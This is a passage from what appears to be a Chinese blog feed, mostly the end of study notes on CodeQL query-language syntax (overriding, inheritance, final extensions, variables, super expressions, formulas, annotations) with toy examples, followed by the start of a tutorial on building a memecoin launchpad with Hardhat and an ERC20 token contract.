PostgresSqlExpr extends SqlExpr</code> ，它包含传递给执行数据库查询的<code>Postgres API</code>的表达式。你也可以为<code>MySQL</code>和其他数据库管理系统定义类似的子类。</p><h5 id="重写成员谓词-Overriding-member-predicates">重写成员谓词(Overriding member predicates)</h5><p>如果一个类从非<code>final</code> 的父类型继承了成员谓词，则可以<strong>重写</strong>继承的定义。为此，你可以定义一个与继承谓词具有相同名称和属性的成员谓词，并添加 <code>override</code><a href="https://codeql.github.com/docs/ql-language-reference/annotations/#override"> 注解 </a>。</p><p>例如，扩展了一下前面的例子：</p><p><code>OneTwo</code>的<code>getAstring()</code>覆盖了原来的<code>OneTwoThree</code>的<code>getAstring()</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">OneTwoThree</span> <span class="keyword">extends</span> <span class="title class_">int</span> &#123;</span><br><span class="line">    OneTwoThree() &#123; <span class="comment">// characteristic predicate</span></span><br><span class="line">      <span class="built_in">this</span> = <span class="number">1</span> <span class="type">or</span> <span class="variable">this</span> <span class="operator">=</span> <span class="number">2</span> <span class="type">or</span> <span class="variable">this</span> <span class="operator">=</span> <span class="number">3</span></span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    string <span class="title function_">getAString</span><span class="params">()</span> &#123; <span class="comment">// member predicate</span></span><br><span class="line">      result = <span class="string">&quot;One, two or three: &quot;</span> + <span class="built_in">this</span>.toString()</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    predicate <span class="title function_">isEven</span><span class="params">()</span> &#123; <span class="comment">// member predicate</span></span><br><span class="line">      <span class="built_in">this</span> = <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OneTwo</span> <span class="keyword">extends</span> <span class="title class_">OneTwoThree</span> &#123;</span><br><span class="line">    OneTwo() &#123;</span><br><span class="line">      <span class="built_in">this</span> = <span class="number">1</span> <span class="type">or</span> <span class="variable">this</span> <span class="operator">=</span> <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">    override string <span class="title function_">getAString</span><span class="params">()</span> &#123;</span><br><span class="line">      result = <span class="string">&quot;One or two: &quot;</span> + <span class="built_in">this</span>.toString()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">from OneTwoThree o select o, o.getAString()</span><br></pre></td></tr></table></figure><p>输出的结果如下：</p><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250430125024851.png" alt="image-20250430125024851"></p><p>再加一个<code>TwoThree</code>，继续重写<code>getAString()</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">OneTwoThree</span> <span class="keyword">extends</span> <span class="title class_">int</span> &#123;</span><br><span class="line">  OneTwoThree() &#123; <span class="comment">// characteristic predicate</span></span><br><span class="line">    <span class="built_in">this</span> = <span class="number">1</span> <span class="type">or</span> <span class="variable">this</span> <span class="operator">=</span> <span class="number">2</span> <span class="type">or</span> <span class="variable">this</span> <span class="operator">=</span> <span class="number">3</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  string <span class="title function_">getAString</span><span class="params">()</span> &#123; <span class="comment">// member predicate</span></span><br><span class="line">    result = <span class="string">&quot;One, two or three: &quot;</span> + <span class="built_in">this</span>.toString()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  predicate <span class="title function_">isEven</span><span class="params">()</span> &#123; <span class="comment">// member predicate</span></span><br><span class="line">    <span class="built_in">this</span> = <span class="number">2</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OneTwo</span> <span class="keyword">extends</span> <span class="title class_">OneTwoThree</span> &#123;</span><br><span class="line">  OneTwo() &#123;</span><br><span class="line">    <span class="built_in">this</span> = <span class="number">1</span> <span class="type">or</span> <span class="variable">this</span> <span class="operator">=</span> <span class="number">2</span></span><br><span class="line">  &#125;</span><br><span class="line">  override string <span class="title function_">getAString</span><span class="params">()</span> &#123;</span><br><span class="line">    result = <span class="string">&quot;One or two: &quot;</span> + <span class="built_in">this</span>.toString()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TwoThree</span> <span class="keyword">extends</span> <span class="title class_">OneTwoThree</span> &#123;</span><br><span class="line">  TwoThree() &#123;</span><br><span class="line">    <span class="built_in">this</span> = <span class="number">2</span> <span class="type">or</span> <span class="variable">this</span> <span class="operator">=</span> <span class="number">3</span></span><br><span class="line">  &#125;</span><br><span class="line">  override string <span class="title function_">getAString</span><span class="params">()</span> &#123;</span><br><span class="line">    result = <span class="string">&quot;Two or three: &quot;</span> + <span class="built_in">this</span>.toString()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from OneTwoThree o</span><br><span class="line">select o, o.getAString()</span><br></pre></td></tr></table></figure><p>运行输出的结果为：</p><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250430124352869.png" alt="image-20250430124352869"></p><h5 id="多重继承-Multiple-inheritance">多重继承(Multiple inheritance)</h5><p>一个类可以扩展多种类型。在这种情况下，它会继承自所有这些类型。</p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Two</span> <span class="keyword">extends</span> <span class="title class_">OneTwo</span>, TwoThree &#123;&#125;</span><br></pre></td></tr></table></figure><p>这个类<code>Two</code>同时继承了<code>OneTwo</code>和<code>TwoThree</code>，它还间接继承自<code>OneTwoThree</code>和<code>int</code>，那么通过特征谓词我们知道其值只能是2。<br>如果一个子类继承了同一个谓词的多个定义，那么该类还需要手动重写该谓词以避免歧义，在这种情况下我们可以考虑使用<code>super</code>表达式。</p><p>例如:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Two</span> <span class="keyword">extends</span> <span class="title class_">OneTwo</span>, TwoThree &#123;</span><br><span class="line">  override string <span class="title function_">getAString</span><span class="params">()</span> &#123;</span><br><span class="line">    result = TwoThree.<span class="built_in">super</span>.getAString()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Final拓展-Final-extensions">Final拓展(Final extensions)</h5><p>类可以扩展<code>final</code>类型或<code>final</code>类型的别名。在这种情况下，它会继承这些父类型的所有成员谓词和字段的<code>final</code>版本。通过<code>final</code>扩展继承的成员谓词无法被覆盖，但可以被隐藏。</p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">OneTwoThree</span> <span class="keyword">extends</span> <span class="title class_">int</span> &#123;</span><br><span class="line">    OneTwoThree() &#123; <span class="comment">// characteristic predicate</span></span><br><span class="line">      <span class="built_in">this</span> = <span class="number">1</span> <span class="type">or</span> <span class="variable">this</span> <span class="operator">=</span> <span class="number">2</span> <span class="type">or</span> <span class="variable">this</span> <span class="operator">=</span> <span class="number">3</span></span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    string <span class="title function_">getAString</span><span class="params">()</span> &#123; <span class="comment">// member predicate</span></span><br><span class="line">      result = <span class="string">&quot;One, two or three: &quot;</span> + <span class="built_in">this</span>.toString()</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    predicate <span class="title function_">isEven</span><span class="params">()</span> &#123; <span class="comment">// member predicate</span></span><br><span class="line">      <span class="built_in">this</span> = <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">FinalOneTwoThree</span> = OneTwoThree;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OneTwoFinalExtension</span> <span class="keyword">extends</span> <span class="title class_">FinalOneTwoThree</span> &#123;</span><br><span class="line">  OneTwoFinalExtension() &#123;</span><br><span class="line">    <span class="built_in">this</span> = <span class="number">1</span> <span class="type">or</span> <span class="variable">this</span> <span class="operator">=</span> <span class="number">2</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  string <span class="title function_">getAString</span><span class="params">()</span> &#123;</span><br><span class="line">    result = <span class="string">&quot;One or two: &quot;</span> + <span class="built_in">this</span>.toString()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">from OneTwoThree o </span><br><span class="line">select o, o.getAString()</span><br><span class="line"><span class="comment">//from OneTwoFinalExtension o </span></span><br><span class="line"><span class="comment">//select o, o.getAString()</span></span><br></pre></td></tr></table></figure><p>运行的结果如下：</p><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250430151657937.png" alt="image-20250430151657937"></p><p>修改为：<code>from OneTwoFinalExtension o select o, o.getAString()</code></p><p>当在<code>OneTwoFinalExtension</code>上调用<code>getAString()</code>时，原始定义被屏蔽了。结果如下：</p><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250430151848901.png" alt="image-20250430151848901"></p><h3 id="变量Variables">变量Variables</h3><p>QL 中的变量使用方式与代数或逻辑中的变量类似。它们表示一组值，这些值通常受公式(<code>formula</code>)约束。</p><p>这与其他一些编程语言中的变量不同，在其他编程语言中，变量代表可能包含数据的内存位置。这些数据也可能随时间而变化。例如，在 <code>QL</code>中， <code>n = n + 1</code> 是一个等式<a href="https://codeql.github.com/docs/ql-language-reference/formulas/#formulas">公式 </a>，仅当 <code>n</code> 等于 <code>n + 1</code> 时才成立（因此实际上它对任何数值都不成立）。在<code>Java</code>中， <code>n = n + 1</code> 不是等式，而是一个赋值操作，它通过在当前值上加 <code>1</code> 来更改 <code>n</code> 的值。</p><h4 id="声明变量-Declaring-a-variable">声明变量(Declaring a variable)</h4><p>所有变量声明都由变量<a href="https://codeql.github.com/docs/ql-language-reference/types/#types">类型</a>和名称组成。名称可以是任何<a href="https://codeql.github.com/docs/ql-language-reference/ql-language-specification/#identifiers">标识符</a> 以小写字母开头。</p><p>例如， <code>int i</code> 、 <code>SsaDefinitionNode node</code> 和 <code>LocalScopeVariable lsv</code> 声明变量 <code>i</code> 、 <code>node</code> 和 <code>lsv</code> 的类型为 <code>int</code> 、 <code>SsaDefinitionNode</code> 和 <code>LocalScopeVariable</code></p><p>变量声明出现在不同的上下文中，例如在<a href="https://codeql.github.com/docs/ql-language-reference/queries/#select-clauses">选择子句</a>中、在<a href="https://codeql.github.com/docs/ql-language-reference/formulas/#quantified-formulas">量化公式</a>中、作为<a href="https://codeql.github.com/docs/ql-language-reference/predicates/#predicates">谓词</a>的参数等等。</p><p>从概念上讲，你可以认为变量保存了其类型允许的所有值，<strong>但要受到任何进一步的约束⚠️</strong>。</p><p>例如，考虑以下选择子句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> <span class="type">int</span> i</span><br><span class="line"><span class="keyword">where</span> i <span class="keyword">in</span> [<span class="number">0</span> .. <span class="number">9</span>]</span><br><span class="line"><span class="keyword">select</span> i</span><br></pre></td></tr></table></figure><p>仅根据变量 <code>i</code> 的类型，它可以包含所有整数。然而，它受到公式 <code>i in [0 .. 9]</code> 的限制。因此，<code>select</code> 子句的结果是从<code>0</code> 到<code>9</code>之间的<code>10</code>个数字（含 <code>0</code> 和 <code>9</code> ）。</p><p>另外，请注意⚠️查询会导致编译时错误：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> <span class="type">int</span> i</span><br><span class="line"><span class="keyword">select</span> i</span><br></pre></td></tr></table></figure><p>理论上，它会有无限多个结果，因为变量<code>i</code>的可能值并不受限于有限个。想了解更多，可参阅“<a href="https://codeql.github.com/docs/ql-language-reference/evaluation-of-ql-programs/#binding"> 绑定 </a>”。</p><h4 id="自由变量和绑定变量-Free-and-bound-variables">自由变量和绑定变量(Free and bound variables)</h4><p>变量可以扮演不同的角色。有些变量是<strong>自由变量</strong> ，它们的值直接影响使用它们的<a href="https://codeql.github.com/docs/ql-language-reference/expressions/#expressions">表达式</a>的值，或者 使用它们的<a href="https://codeql.github.com/docs/ql-language-reference/formulas/#formulas">公式</a>是否成立。其他变量被称为<strong>绑定</strong>变量，它们被限制在特定的值集内。</p><p>例子如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&quot;hello&quot;.indexOf(&quot;l&quot;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">min</span>(<span class="type">float</span> f <span class="operator">|</span> f <span class="keyword">in</span> [<span class="number">-3</span> .. <span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">(i <span class="operator">+</span> <span class="number">7</span>) <span class="operator">*</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">x.<span class="built_in">sqrt</span>()</span><br></pre></td></tr></table></figure><p>第一个表达式没有任何变量。它查找字符串 <code>&quot;hello&quot;</code> 中 <code>&quot;l&quot;</code> 出现的（从零开始的）索引，因此其计算结果为 <code>2</code> 和 <code>3</code> 。</p><p>第二个表达式的计算结果为 <code>-3</code> ，即 <code>[-3 .. 3]</code> 范围内的最小值。虽然此表达式使用了变量 <code>f</code> ，但它只是一个占位符或“虚拟”变量，您无法为其赋值。您可以将 <code>f</code> 替换为其他变量，而不会改变表达式的含义。例如， <code>min(float f | f in [-3 .. 3])</code> 始终等于 <code>min(float other | other in [-3 .. 3])</code> . 这是<strong>绑定变量</strong>的一个例子。</p><p>对于表达式 <code>(i + 7) * 3</code> 和 <code>x.sqrt()</code> 。在这两个例子中，表达式的值取决于变量 <code>i</code> 和 <code>x</code> 分别被赋值的值。换句话说，变量的值会影响表达式的值。这些都是<strong>自由变量</strong>的例子。</p><p>类似地，如果公式包含自由变量，则该公式是否成立取决于分配给这些变量的值。例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&quot;hello&quot;.indexOf(&quot;l&quot;) <span class="operator">=</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">min</span>(<span class="type">float</span> f <span class="operator">|</span> f <span class="keyword">in</span> [<span class="number">-3</span> .. <span class="number">3</span>]) <span class="operator">=</span> <span class="number">-3</span></span><br><span class="line"></span><br><span class="line">(i <span class="operator">+</span> <span class="number">7</span>) <span class="operator">*</span> <span class="number">3</span> instanceof <span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">exists</span>(<span class="type">float</span> y <span class="operator">|</span> x.<span class="built_in">sqrt</span>() <span class="operator">=</span> y)</span><br></pre></td></tr></table></figure><ul><li><p>第一个公式不包含任何变量，并且永远不会成立（因为 <code>&quot;hello&quot;.indexOf(&quot;l&quot;)</code> 具有值 <code>2</code> 和 <code>3</code> ，而没有 <code>1</code> ）。</p></li><li><p>第二个公式仅包含一个绑定变量，因此不受该变量变化的影响。由于 <code>min(float f | f in [-3 .. 3])</code> 等于 <code>-3</code> ，因此该公式始终成立。</p></li><li><p>第三个公式包含一个自由变量 <code>i</code> 。公式是否成立取决于赋给 <code>i</code> 值。例如，如果赋给 <code>i</code> 值为<code>1</code> 或 <code>2</code> （或任何其他 <code>int</code> ），则公式成立。另一方面，如果赋给 <code>i</code>值为 <code>3.5</code> ，则公式不成立。</p></li></ul><p>第四个公式包含一个自由变量 <code>x</code> 和一个绑定变量 <code>y</code> 。如果 <code>x</code> 被赋值为非负数，则最后一个公式成立。另一方面，如果 <code>x</code> 被赋值为 例如 <code>-9</code> ，则公式不成立。变量 <code>y</code> 不会影响公式是否成立。</p><h3 id="表达式Expressions">表达式Expressions</h3><p>表达式计算一组值并具有类型。例如，表达式 <code>1 + 2</code> 计算结果为整数 <code>3</code> ，表达式 <code>&quot;QL&quot;</code> 计算结果为字符串 <code>&quot;QL&quot;</code> 。1 <code>1 + 2</code><a href="https://codeql.github.com/docs/ql-language-reference/types/#types"> 类型</a>为 <code>int</code> ，而 <code>&quot;QL&quot;</code> 类型为 <code>string</code> 。本小节只讲述父类表达式，其它可参考<sup class="footnote-ref"><a href="#fn9" id="fnref9">[9]</a></sup>。</p><h4 id="父类表达式-Super-expressions">父类表达式(Super expressions)</h4><p><code>QL</code>中的父类表达式与其他编程语言（例如<code>Java</code>）中的父类表达式类似。当您想要使用父类型的谓词定义时，可以在谓词调用中使用它们。实际上，当谓词从其父类型继承两个定义时，这很有用。在这种情况下，谓词必须<a href="https://codeql.github.com/docs/ql-language-reference/types/#overriding-member-predicates">重写</a> 这些定义是为了避免歧义。 但是，如果你想使用特定超类型的定义，而不是编写新的定义，可以使用父类表达式。</p><p>在下面的例子中，类 <code>C</code> 继承了谓词的两个定义 <code>getANumber()</code> — 一个来自 <code>A</code> ，一个来自 <code>B</code> 。它不会重写两个定义，而是使用 <code>B</code> 中的定义。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> <span class="keyword">extends</span> <span class="title class_">int</span> &#123;</span><br><span class="line">  A() &#123; <span class="built_in">this</span> = <span class="number">1</span> &#125;</span><br><span class="line">  <span class="type">int</span> <span class="title function_">getANumber</span><span class="params">()</span> &#123; result = <span class="number">2</span> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_">int</span> &#123;</span><br><span class="line">  B() &#123; <span class="built_in">this</span> = <span class="number">1</span> &#125;</span><br><span class="line">  <span class="type">int</span> <span class="title function_">getANumber</span><span class="params">()</span> &#123; result = <span class="number">3</span> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> <span class="keyword">extends</span> <span class="title class_">A</span>, B &#123;</span><br><span class="line">  <span class="comment">// Need to define `int getANumber()`; otherwise it would be ambiguous</span></span><br><span class="line">  override <span class="type">int</span> <span class="title function_">getANumber</span><span class="params">()</span> &#123;</span><br><span class="line">    result = B.<span class="built_in">super</span>.getANumber()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from C c</span><br><span class="line">select c, c.getANumber()</span><br></pre></td></tr></table></figure><p>该查询的结果为：</p><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250430190645346.png" alt="image-20250430190645346"></p><h3 id="公式Formulas">公式Formulas</h3><p>公式定义表达式中使用的自由变量之间的逻辑关系。</p><p>根据赋予这些<a href="https://codeql.github.com/docs/ql-language-reference/variables/#free-variables">自由变量</a>的值，公式可能为真或为假。当公式为真时，我们通常说该公式成立 。</p><p>例如，如果将值 <code>9</code> 赋给 <code>x</code> ，公式 <code>x = 4 + 5</code> 成立，但对于其他赋值，公式 <code>x</code> = 4 + 5 不成立。有些公式没有任何自由变量。例如， <code>1 &lt; 2</code> 始终成立，而 <code>1 &gt; 2</code> 永远不会成立。</p><p>下面只介绍个人认为比较特殊的点，其它点较为简单，可参考原文<sup class="footnote-ref"><a href="#fn10" id="fnref10">[10]</a></sup>。</p><h4 id="顺序-Order">顺序(Order)</h4><p>要使用这些顺序运算符之一比较两个表达式，每个表达式必须具有一个类型，并且这些类型必须<a href="https://codeql.github.com/docs/ql-language-reference/types/#type-compatibility">兼容</a>并且 <a href="https://codeql.github.com/docs/ql-language-reference/ql-language-specification/#ordering">可排序的 </a>。</p><p>这些符号为：<code>&gt;、&gt;=、&lt;、&lt;=</code></p><p>例如，公式 <code>&quot;Ann&quot; &lt; &quot;Anne&quot;</code> 和 <code>5 + 6 &gt;= 11</code> 均成立。</p><h3 id="注解Annotations">注解Annotations</h3><p>注释是一个字符串，您可以将其直接放置在<code>QL</code> 实体或名称的声明之前。类似于<code>Java</code>语言。</p><p>例如，要将模块 <code>M</code> 声明为私有的，您可以使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">module</span> M &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>请注意，一些注释作用于实体本身，而其他注释作用于实体的特定<em>名称</em> ：</p><ul><li><p>对<strong>实体</strong>进行操作： <code>abstract</code> 、 <code>cached</code> 、 <code>external</code> 、 <code>transient</code> 、 <code>override</code> 、 <code>pragma</code> 、 <code>language</code> 和 <code>bindingset</code></p></li><li><p>对<strong>名称</strong>进行操作： <code>deprecated</code> 、 <code>library</code> 、 <code>private</code> 、 <code>final</code> 和 <code>query</code></p></li></ul><p>例如，如果你使用 <code>private</code> 注释一个实体，那么只有该特定名称是私有的。你仍然可以使用其他名称（使用 <a href="https://codeql.github.com/docs/ql-language-reference/aliases/#aliases">alias</a> ）访问该实体。另一方面，如果您使用 <code>cached</code> 注释一个实体，那么该实体本身将被缓存。</p><p>具体的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> M &#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">foo</span><span class="params">()</span> &#123; result = <span class="number">1</span> &#125;</span><br><span class="line">  <span class="type">predicate</span> <span class="variable">bar</span> <span class="operator">=</span> foo/<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这种情况下，查询 <code>select M::foo()</code> 会报错，因为名称 <code>foo</code> 是私有的。查询 <code>select M::bar()</code> 是有效的（返回结果 <code>1</code> ），因为名称 <code>bar</code> 是可见的，并且它是谓词 <code>foo</code> 的别名。</p><h2 id="参考">参考</h2><hr class="footnotes-sep"><section class="footnotes"><ol class="footnotes-list"><li id="fn1" class="footnote-item"><p><a href="https://codeql.github.com/docs/codeql-overview/supported-languages-and-frameworks/">https://codeql.github.com/docs/codeql-overview/supported-languages-and-frameworks/</a> ↩ <a href="#fnref1" class="footnote-backref">↩︎</a></p></li><li id="fn2" class="footnote-item"><p><a href="https://paper.seebug.org/1324/">https://paper.seebug.org/1324/</a> <a href="#fnref2" class="footnote-backref">↩︎</a></p></li><li id="fn3" class="footnote-item"><p><a href="https://bbs.kanxue.com/article-20135.htm">https://bbs.kanxue.com/article-20135.htm</a> <a href="#fnref3" class="footnote-backref">↩︎</a></p></li><li id="fn4" class="footnote-item"><p><a href="https://github.com/webraybtl/CodeQLpy">https://github.com/webraybtl/CodeQLpy</a> <a href="#fnref4" class="footnote-backref">↩︎</a></p></li><li id="fn5" class="footnote-item"><p><a href="https://github.com/WebGoat/WebGoat">https://github.com/WebGoat/WebGoat</a> <a href="#fnref5" class="footnote-backref">↩︎</a></p></li><li id="fn6" class="footnote-item"><p><a href="https://codeql.github.com/docs/ql-language-reference/predicates/">https://codeql.github.com/docs/ql-language-reference/predicates/</a> <a href="#fnref6" class="footnote-backref">↩︎</a></p></li><li id="fn7" class="footnote-item"><p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/">https://longlone.top/安全/安全研究/codeql/2.CodeQL语法/</a> <a href="#fnref7" class="footnote-backref">↩︎</a></p></li><li id="fn8" class="footnote-item"><p><a href="https://codeql.github.com/docs/ql-language-reference/queries/#">https://codeql.github.com/docs/ql-language-reference/queries/#</a> <a href="#fnref8" class="footnote-backref">↩︎</a></p></li><li id="fn9" class="footnote-item"><p><a href="https://codeql.github.com/docs/ql-language-reference/expressions/#">https://codeql.github.com/docs/ql-language-reference/expressions/#</a> <a href="#fnref9" class="footnote-backref">↩︎</a></p></li><li id="fn10" class="footnote-item"><p><a href="https://codeql.github.com/docs/ql-language-reference/formulas/#formulas">https://codeql.github.com/docs/ql-language-reference/formulas/#formulas</a> <a href="#fnref10" class="footnote-backref">↩︎</a></p></li></ol></section>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CodeQL </tag>
            
            <tag> QL语法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>做个像Pump.fun一样的Memecoin启动台</title>
      <link href="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/"/>
      <url>/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="安装初始环境">安装初始环境</h2><p>安装<code>hardhat</code>，并配置node环境，我使用的<code>node</code>环境为<code>v22.13.0</code>。</p><p>下载github项目</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b starter_code https://github.com/dappuniversity/fun-pump</span><br></pre></td></tr></table></figure><p>进入到目录下<code>/FUN-PUMP</code>，使用<code>npm install</code>进行安装</p><h2 id="创建Token">创建Token</h2><p>使用<code>ERC20.sol</code>创建<code>token</code>，参考<code>openzeppelin</code>。</p><p>使用到<code>Remix</code>去编写<code>token</code>的solidity，<code>Token.sol</code>的代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity 0.8.27;</span><br><span class="line"></span><br><span class="line">import &#123;ERC20&#125; from &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Token is ERC20 